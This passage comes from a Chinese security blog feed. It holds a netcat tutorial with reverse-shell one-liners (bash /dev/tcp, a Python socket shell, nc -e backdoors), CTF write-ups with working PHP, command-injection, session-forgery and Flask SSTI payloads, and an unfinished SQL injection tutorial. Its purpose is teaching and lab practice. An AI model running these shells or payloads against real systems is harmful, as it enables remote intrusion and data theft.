class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>客户端</li></ul><pre class="line-numbers language-none"><code class="language-none">nc [remote_addr] [remoteport]#连接服务端192.168.1.1的4444端口nc 192.168.1.1 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>目标没有安装netcat</p></blockquote><ul><li>服务端</li></ul><pre class="line-numbers language-none"><code class="language-none">nc -lvp portnc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>客户端</li></ul><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/[target_ip]/[taget_port] 0&gt;&amp;1bash -i &gt;&amp; /dev/tcp/192.168.1.1/4444 0&gt;&amp;1--命令解释--bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1bash -i 表示以交互模式运行bash she1l&gt;&amp; 表示重定向符/dev/tcp/ip/port 表示传递给远程主机的IP地址对应的端口。0&gt;&amp;1 表示将标准输入重定向到标准输出，实现远程的输入可以在远程输出对应内容。-------------------------------------------------------bash -i，如果在其后加文件描述符，是将bash -i 交互模式传递给文件描述符如果其后是文件，则将bash -i 交互模式传递给文件。-------------------------------------------------------文件描述符: 0 标准输入、1标准输出、2错误输入输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>目标没有安装netcat，但是安装了Python</p></blockquote><ul><li>客户端</li></ul><pre class="line-numbers language-none"><code class="language-none">python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.60.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"--命令解释--首先使用socket与远程建立起连接，具有了远程的文件描述符3。可以使用s. fileno( )来查看具体套接字建立的远程文件描述符。os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程，使用os的subprocess在本地开启一个子进程，传入参数"-i" 使bash以交互模式启动，标准输入、标准输出、标准错误输出又被重定向到了远程，这样就可以实现反弹shel1。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>服务器</li></ul><pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>目标支不支持 nc -e</p></blockquote><ul><li>客户端</li></ul><pre class="line-numbers language-none"><code class="language-none">nc ip port | /bin/bash | nc ip portnc 192.168.60.1 4444| /bin/bash | nc 192.168.60.1 4445<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>服务器</li></ul><pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444nc -lvp 4445需要同时监听两个端口，一个用于输入，一个用于输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><ul><li><strong>取证</strong><br>当目标机器被黑客攻击之后，取证人员可以利用nc的文件传输功能来获取目标机器上的文件内容。避免直接在目标机器上进行操作造成取证的误差。</li><li><strong>单纯获取目标机器敏感文件</strong><br>当目标机器上有一-些文件内容，无法正常下载时，可以利用nc进行文件传输。</li><li><strong>为什么可以直接利用nc进行文件传输呢?</strong><br>nc中的数据传输使用的是标准的输入、输出流，所以可以直接利用命令行来进行操作。</li></ul><blockquote><p>客户端向服务端传输文件</p></blockquote><ul><li>服务端</li></ul><pre class="line-numbers language-none"><code class="language-none">nc -l -p [localport] &gt; outfile#nc -l -p 4444 &gt; outfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>客户端</li></ul><pre class="line-numbers language-none"><code class="language-none">nc [remote_addr] [remoteport] &lt; infile#nc 192.168.1.1 4444 &lt; infile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>服务端向客户端传输数据</p></blockquote><ul><li>服务端</li></ul><pre class="line-numbers language-none"><code class="language-none">nc -l -p [localport] &lt; infile#nc -l -p 4444 &gt; infile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>客户端</li></ul><pre class="line-numbers language-none"><code class="language-none">nc [remote_addr] [remoteport] &gt; outfile#nc 192.168.1.1 4444 &lt; outfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><p>避免nc“假死”</p><p>如果此时服务端并没有准备好连接，而客户端已经使用nc进行连接，那么客户端会一直等待下去，直到连接上服务端，造成一种“假死”状态。<br>解决方法:设置等待时间。</p><pre class="line-numbers language-none"><code class="language-none">#设置等待3秒钟，超过3秒钟，客户端直接关闭等待连接。nc -w3 [ip] [port]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h1 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h1><ul><li><strong>目标内网的扫描</strong><br>当获得目标权限之后，如果目标没有任何途径可以对内网进行探测，但此时刚好具有一个netcat<br>的话，就可以使用netcat进行内网ip和端口的扫描。</li><li><strong>单纯对某个目标进行端口探测</strong><br>当手头没有任何探测工具可以使用netcat进行端口探测。</li><li><strong>对目标的服务banner进行抓取</strong><br>通过netcat对目标端口进行探测。</li></ul><blockquote><p>端口扫描的使用方法</p></blockquote><pre class="line-numbers language-none"><code class="language-none">nc -v -n -z -w1 [target_ip] [start_target_port-stop_target_port]-v 表示对错误进行详细输出-n 不对目标机器进行DNS解析-z zero I/0模式，专用于端口扫描。表示对目标IP发送的数据表中不包含任何payload,这样做可以加快扫描的速度。-w1超时设置为1秒。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>抓取banner信息</p></blockquote><pre class="line-numbers language-none"><code class="language-none">echo " " | nc -v -n -w1 [target_ip] [start_target_port-stop_target_port]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="建立后门"><a href="#建立后门" class="headerlink" title="建立后门"></a>建立后门</h1><ul><li><p>获取目标的命令执行权限<br>当目标机器上存在netcat之后，可以使用netcat建立后门,来实现执行目标命令的功能。</p></li><li><p>为什么可以使用netcat建立后门，并返回操作结果?</p><p>netcat 一切数据时通过标准输入/输出流实现的，所以可以利用netcat的命令行进行后门 建立，并传输结果信息。</p></li></ul><blockquote><p>监听型后门：</p></blockquote><pre class="line-numbers language-none"><code class="language-none"># 服务端监听4444端口，如果收到连接则返回shellnc -l -p 4444 -e [shell]# 客户端直接连接nc 192.168.60.1 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>连接型后门：</p></blockquote><pre class="line-numbers language-none"><code class="language-none"># 服务端直接监听4444端口nc -l -p 4444# 客户端连接并携带shellnc [remote_ip] [remote_port] -e [shell]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210411161017.png"></p><pre class="line-numbers language-none"><code class="language-none">#A与B是nat#B与C是桥接#要实现C通过B转发，可以与A通信#A 192.168.2.1nc -l -p 4444#B 192.168.1.1nc -l -p 4445 -e con.bat#C 192.168.1.2nc 192.168.60.1.1 4445#B中con.bat的内容nc 192.168.2.1 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> netcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xmctf</title>
      <link href="2021/04/06/xmctf/"/>
      <url>2021/04/06/xmctf/</url>
      
        <content type="html"><![CDATA[<p> 关于星盟xmctf上的一些题目。感觉自己还是见得题太少了，有一些题目有些懵懵懂懂的，好多都是参考一些大佬的，不过自己还是整出来了。加油吧~~~</p><h1 id="easy-web"><a href="#easy-web" class="headerlink" title="easy-web"></a>easy-web</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>源代码贴上，如下：</p><pre class="line-numbers language-none"><code class="language-none"> &lt;?phpshow_source(__FILE__);$key = "bad";extract($_POST);if($key === 'bad'){    die('badbad!!!');}$act = @$_GET['act'];$arg = @$_GET['arg'];if(preg_match('/^[a-z0-9_]*$/isD',$act)) {    echo 'check';} else {    $act($arg,'');}echo '666';badbad!!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><table><thead><tr><th>函数名</th><th>描述</th></tr></thead><tbody><tr><td>show_source()<br>highlight_file()</td><td>语法高亮</td></tr><tr><td>extract()</td><td>从数组中将变量导入到当前的符号表。<br>使用数组键名作为变量名，使用数组键值作为变量值。<br>针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>该函数返回成功设置的变量数目。</td></tr></tbody></table><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><table><thead><tr><th>pattern</th><th>描述</th></tr></thead><tbody><tr><td>/i</td><td>不区分大小写</td></tr><tr><td>/s</td><td>匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[\f\n\r\t\v]</td></tr><tr><td>/D</td><td>如果使用$限制结尾字符,则不允许结尾有换行</td></tr></tbody></table><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><pre class="line-numbers language-none"><code class="language-none">import requestsdata={'key':123}#任意post一个keyfor i in range(1,256):    h=hex(i)[2:]    if len(h)&lt;2:        h='0'+h    h='%'+h    url='http://447-9fedb10a-22a3-46e0-a47a-06f5fd752e54.xmctf.top:8849/?act='+h+'var_dump&amp;arg=111'    r=requests.post(url,data=data)    if '111' in r.text:        print(h)        break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h3><p>使用匿名函数来饶过正则表达式</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none"># 原始act=\create_function&amp;arg=){}要执行的代码;//# 列出当前目录下的文件act=\create_function&amp;arg=){return 123;}system('ls .../');//# 查看flagact=\create_function&amp;arg=){return 123;}system('cat /ffflll4g');//<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);highlight_file(__file__);$ip = $_GET['ip'];if (isset($ip)) {  if(preg_match("/(;|`| |&amp;|cp|mv|cat|tail|more|rev|tac|\*|\{)/i", $ip)){      die("hack");  }else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){      die("no!&gt;");  }  $a = shell_exec("ping -c 4 ".$ip);  var_dump($a);}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>过滤的字符</th><th>绕过</th></tr></thead><tbody><tr><td>|    &amp;</td><td>%0a</td></tr><tr><td>cat     more</td><td>sort</td></tr><tr><td>flag</td><td>fla? fl??  f???</td></tr></tbody></table><p>payload</p><pre class="line-numbers language-none"><code class="language-none">ip=%0asort%09/fla?或者ip=127.0.0.1%0asort%09/fla?其中%09是一个制表符的URL编码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);$content = @$_GET['content'] ? "---mylocalnote---\n" . $_GET['content'] : "";$name = @$_GET['name'] ? $_GET['name'] : '';str_replace('/', '', $name);str_replace('\\', '', $name);file_put_contents("/tmp/" . $name, $content);session_start();if (isset($_SESSION['username'])) {    echo "Thank u,{$_SESSION['username']}";}//flag in flag.php <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>PHP存储session的方式</th><th>描述</th></tr></thead><tbody><tr><td>php_serialize</td><td>经过serialize()函数序列化数组</td></tr><tr><td>php</td><td>键名+竖线+经过serialize()函数处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的ascii字符+键名+serialize()函数序列化的值</td></tr></tbody></table><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>str_replace()</td><td>子字符串替换</td></tr><tr><td>file_put_contents()</td><td>file_put_contents — 将一个字符串写入文件</td></tr><tr><td>session_start()</td><td>启动新会话或者重用现有会话</td></tr></tbody></table><p> 题目要求$_SESSION[‘username’]=’admin’</p><p>向/tmp中写入文件</p><pre class="line-numbers language-none"><code class="language-none">username|s:6:'admin';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload </p><pre class="line-numbers language-none"><code class="language-none">content=|N;username|s:5:"admin";&amp;name=sess_{your PHPSESSID}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问/flag.php</p><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><blockquote><p>好几个四季了，我在等我的主人回来<br>key：e086aa137fa19f67d27b39d0eca18610</p></blockquote><p>key扔cmd5解出1.1.1.1，可能为IP地址，放到请求头</p><p>X-Forwarded-For: 1.1.1.1</p><p>提示存在dhudndrgrhs.php，访问得到源代码</p><h2 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?phpshow_source(__FILE__);error_reporting(0);$disable_fun = ["assert","print_r","system", "shell_exec","ini_set", "scandir", "exec","proc_open", "error_log", "ini_alter", "ini_set", "pfsockopen", "readfile", "echo", "file_get_contents", "readlink", "symlink", "popen", "fopen", "file", "fpassthru"];$disable_fun = array_merge($disable_fun, get_defined_functions()['internal']);foreach($disable_fun as $i){    if(stristr($_GET[shell], $i)!==false){        die('xmctf');    }}eval($_GET[shell]); <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>array_merge()</td><td>合并一个或多个数组</td></tr><tr><td>get_defined_functions()</td><td>返回所有已定义函数的数组</td></tr><tr><td><strong>stristr</strong>    ( string <code>$haystack</code>   , <a href="https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed">mixed</a> <code>$needle</code>   , bool <code>$before_needle</code> = <strong><code>false</code></strong>   ) : string</td><td>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到结尾的字符串。</td></tr></tbody></table><h2 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h2><p>payload</p><pre class="line-numbers language-none"><code class="language-none">#拼接变量$a=sys;$b=tem;$c=$a.$b;$d='cat flag.php';$c($d);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><blockquote><p>SSTI flask</p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210409133311.png"></p><p>根据提示，需要以admin的方式访问flag。携带当前session访问flag不能成功的。</p><p>传参数name=49，发现是SSTI。</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210409133535.png"></p><p>然后传参?name=可以查看到，secret_key</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210409134254.png"></p><p>后端使用的是flash框架。</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210409133630.png"></p><p>先安装pip install flask-unsign[wordlist] 。</p><p>然后在浏览器中复制当前session</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210409133934.png"></p><pre class="line-numbers language-none"><code class="language-none">flask-unsign --decode --cookie "eyJ1c2VybmFtZSI6eyIgYiI6IlozVmxjM1E9In19.YG_mFg.vvRMxGy5nnpJ2SWwiDAWq0E5H-s"{'username': b'guest'}#修改guest为adminflask-unsign --sign --cookie "{'username': b'admin'}" --secret "woshicaiji"eyJ1c2VybmFtZSI6eyIgYiI6IllXUnRhVzQ9In19.YG_mrQ.-bDC0fkgAK6CetHKwi-5h_jsPb0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在浏览器中用新的session替换后再访问/flag即可得到flag。</p><h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p>后端仍然使用的是flask，然后同时也存在SSTI。但是过滤了一些字符。</p><p>经过fuzz之后发现过滤了一些字符如 . _ arg</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">#get传入?name={{ ()|attr(request['values']['x1'])|attr(request['values']['x2'])| attr(request['values']['x3'])()|attr(request['values']['x6'])(233)| attr(request['values']['x4'])| attr(request['values']['x5'])| attr(request['values']['x6'])(request['values']['x7'])| attr(request['values']['x6'])(request['values']['x8'])(request['values']['x9']) }}#post传入x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__init__&amp;x5=__globals__&amp;x6=__getitem__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__("os").popen('cat /fl4g|base64').read()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><h2 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h2><pre class="line-numbers language-none"><code class="language-none">&lt;?phpheader("Content-Type: text/html;charset=utf-8");include "flag.php";echo "flag在哪里呢？&lt;br&gt;";highlight_file(__FILE__);error_reporting(0);if(isset($_GET['exp'])){    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {            if (!preg_match('/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {                // echo $_GET['exp'];                @eval($_GET['exp']);            }            else{                die("还差一点哦！");            }        }        else{            die("再好好想想！");        }    }    else{        die("还想读flag，臭弟弟！");    }}// highlight_file(__FILE__);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>localeconv()</td><td>获取 ‘.’</td></tr><tr><td>current()<br>pos()</td><td>返回当前数组值</td></tr><tr><td>next()</td><td>获取下一个数组的值</td></tr><tr><td>end()</td><td>获取最后一个数组的值</td></tr><tr><td>array_rand()</td><td>返回随机的数字键值</td></tr><tr><td>arrat_flip()</td><td>数组的键名和键值交换</td></tr><tr><td>scandir()</td><td>返回指定目录中的文件和文件夹</td></tr><tr><td>array_reverse()</td><td>数组逆序</td></tr></tbody></table><p>payload</p><pre class="line-numbers language-none"><code class="language-none">#获取当前目录的文件?exp=var_dump(scandir(pos(localeconv())));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210409142047.png"></p><p>接下来获取flag.php<br>payload：</p><pre class="line-numbers language-none"><code class="language-none">?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>session_start()</td><td>开启session</td></tr><tr><td>session_id()</td><td>获取 PHPSESSID的值</td></tr></tbody></table><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?exp=highlight_file(session_id(session_start()));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>BP抓包添加一行</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210410192041.png"></p><p>然后查看响应包就能得到flag</p><p>8dba5045b4638241db0f44e8727ba89e.php</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入-详细步骤</title>
      <link href="2021/04/05/sql-inject/"/>
      <url>2021/04/05/sql-inject/</url>
      
        <content type="html"><![CDATA[<p> sql注入的详细步骤，包括寻找注入点，一些基本的流程，还有几种常见的sql注入分类的原理，已经修复建议等。</p><h2 id="寻找-SQL-注入点"><a href="#寻找-SQL-注入点" class="headerlink" title="寻找 SQL 注入点"></a>寻找 SQL 注入点</h2><h3 id="目标搜集"><a href="#目标搜集" class="headerlink" title="目标搜集"></a>目标搜集</h3><h4 id="无特定目标"><a href="#无特定目标" class="headerlink" title="无特定目标"></a>无特定目标</h4><ul><li>inurl:php?id=</li></ul><h4 id="有特定目标"><a href="#有特定目标" class="headerlink" title="有特定目标"></a>有特定目标</h4><ul><li>inurl:php?id= site:target.com</li></ul><h4 id="工具爬取"><a href="#工具爬取" class="headerlink" title="工具爬取"></a>工具爬取</h4><ul><li>spider，对搜索引擎和目标网站的连接进行爬取</li></ul><h3 id="注入识别"><a href="#注入识别" class="headerlink" title="注入识别"></a>注入识别</h3><h4 id="手工简单识别"><a href="#手工简单识别" class="headerlink" title="手工简单识别"></a>手工简单识别</h4><ul><li><p>and 1=1 / and 1=2</p></li><li><p>and ‘1’=’1 / and ‘1’=’2</p></li><li><p>and 1 like 1 / and 1 like 2</p></li></ul><h4 id="工具识别"><a href="#工具识别" class="headerlink" title="工具识别"></a>工具识别</h4><p>sqlmap -m filename (filename 中保存检测目标)</p><p>sqlmap –crawl (sqlmap 对目标网站进行爬取，然后依次进行测试)</p><h4 id="高级识别"><a href="#高级识别" class="headerlink" title="高级识别"></a>高级识别</h4><p>拓展广度和深度</p><ul><li><p>sqlmap –level 增加测试级别（1-5），对 head 中的相关参数也进行测试</p></li><li><p>sqlmap -r filename （file 中为网站请求数据）</p></li></ul><p>利用工具提高识别效率</p><ul><li><p>burpsuite+sqlmap</p></li><li><p>burpsuite 拦截所有浏览器访问提交的数据</p></li><li><p>burpsuite 扩展插件，直接调用 sqlmap 进行测试（插件-SQLiPy Sqlmap Intergration || 也可以自己写插件）</p></li></ul><p>一些 Tips:</p><ul><li><p>可以在参数后键入“*”来确定想要测试的参数</p></li><li><p>可能出现注入的点：新闻、登陆、留言</p></li><li><p>站在开发的角度去寻找</p></li></ul><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><ul><li><p>搜索关键代码和函数</p></li><li><p>梳理业务流程</p></li></ul><p>例子：强网杯 WEB”python is the best language”</p><h2 id="SQL-注入流程"><a href="#SQL-注入流程" class="headerlink" title="SQL 注入流程"></a>SQL 注入流程</h2><h3 id="流程导图"><a href="#流程导图" class="headerlink" title="流程导图"></a>流程导图</h3><p><img src="https://github.com/southerose/PictureBed/raw/master/img/Sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B.png"></p><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p><img src="https://github.com/southerose/PictureBed/raw/master/img/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png"></p><h4 id="数据获取"><a href="#数据获取" class="headerlink" title="数据获取"></a>数据获取</h4><p><img src="https://github.com/southerose/PictureBed/raw/master/img/%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.png"></p><h5 id="手工查询"><a href="#手工查询" class="headerlink" title="手工查询"></a>手工查询</h5><ul><li><p>查库</p><pre class="line-numbers language-none"><code class="language-none">select schema_name from information_schema.schemata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查表</p><pre class="line-numbers language-none"><code class="language-none">select table_name from information_schema.tables where table_schema=库名 \ 0x库名 \ database()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查列</p><pre class="line-numbers language-none"><code class="language-none">select column_name from information_scheme.columns where table_name=表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查数据</p><pre class="line-numbers language-none"><code class="language-none">select 列名 from 库名.表名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h5 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h5><ol><li>所有的 Sql 注入，都是基于查库、表、列语句</li><li>如果数据太多导致无法查询结果<br>查询的场景：可利用 limit 限定返回的数量及位置，依次查询<br>回显数据的场景：concat() ,group_concat(),concat_ws()+limit</li><li>在一些场景，想要快速获取数据，需借助工具，如：BurpSuite</li></ol><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img src="https://github.com/southerose/PictureBed/raw/master/img/%E6%8F%90%E6%9D%83.png"></p><h3 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h3><h4 id="UNION-联合查询注入"><a href="#UNION-联合查询注入" class="headerlink" title="UNION 联合查询注入"></a>UNION 联合查询注入</h4><blockquote><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集</p></blockquote><p><strong>注意：</strong></p><ul><li><p>UNION 内部的 SELECT 语句必须拥有相同数量的列。</p></li><li><p>列也必须拥有相似的数据类型。</p></li><li><p>同时每条 SELECT 语句中的列的顺序必须相同。</p></li><li><p>默认情况下，UNION 操作符选取不同的值。如果允许重复的值，则使用 UNION ALL。</p></li></ul><h5 id="UNION-注入应用场景"><a href="#UNION-注入应用场景" class="headerlink" title="UNION 注入应用场景"></a>UNION 注入应用场景</h5><ul><li>只有最后一个 SELECT 子句允许有 ORDER BY；</li><li>只有最后一个 SELECT 子句允许有 LIMIT；</li><li>只要 UNION 连接的几个查询的字段数一样且列的数据类型转换没有问题，就可以查询出结果；</li><li>注入点页面有回显；</li></ul><h5 id="UNION-注入过程"><a href="#UNION-注入过程" class="headerlink" title="UNION 注入过程"></a>UNION 注入过程</h5><blockquote><p>ORDER BY 猜出来的列数超过数据库表中的列数，报错并不能返回出数据</p></blockquote><ol><li>ORDER BY 确定列数</li><li>观察页面返回，选取可以显示数据的位置，进行下一步的注入</li><li>读库信息</li><li>读表信息</li><li>读字段</li><li>读数据</li></ol><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><blockquote><p>构造 payload 让信息通过错误提示回显出来</p></blockquote><h5 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h5><p>查询不回现内容，会打印错误信息</p><p>Update、insert 等语句，会打印错误信息</p><h5 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h5><p>凡是能够让错误信息显示的函数（语句），都能实现报错注入，以下列举 3 种。</p><ul><li>foor()</li></ul><pre class="line-numbers language-none"><code class="language-none">select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2))//concat:连接字符串功能//floor:取flout的整数值//rand:取0~1之间的随机浮点值//group by:根据一个或多个列对结果集进行分组并有排序功能<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>extractvalue()</li></ul><pre class="line-numbers language-none"><code class="language-none">select extractvalue(1,concat(0x7e,(select user()),0x7e))//去掉select也可以extractvalue(1,concat(0x7e,(user()),0x7e))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>updatexml()</li></ul><pre class="line-numbers language-none"><code class="language-none">select updatexml(1,concat(0x7e,(select user()),0x7e),1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><blockquote><p>构造语句来判断数据库信息的正确性，再通过页面的‘真’和‘假’（状态）来识别我们的判断是否正确。</p><p>举个猜单词的例子：“good”，第一位我猜是‘’a‘’，页面返回假，但是我猜‘g’，页面就返回真。然后依次猜后面的字母。</p></blockquote><h6 id="布尔盲注的方法"><a href="#布尔盲注的方法" class="headerlink" title="布尔盲注的方法"></a>布尔盲注的方法</h6><blockquote><p>构造逻辑判断语句，判断信息的真假，取出所有的真值，实现 SQL 注入</p></blockquote><table><thead><tr><th align="center">序号</th><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">1</td><td 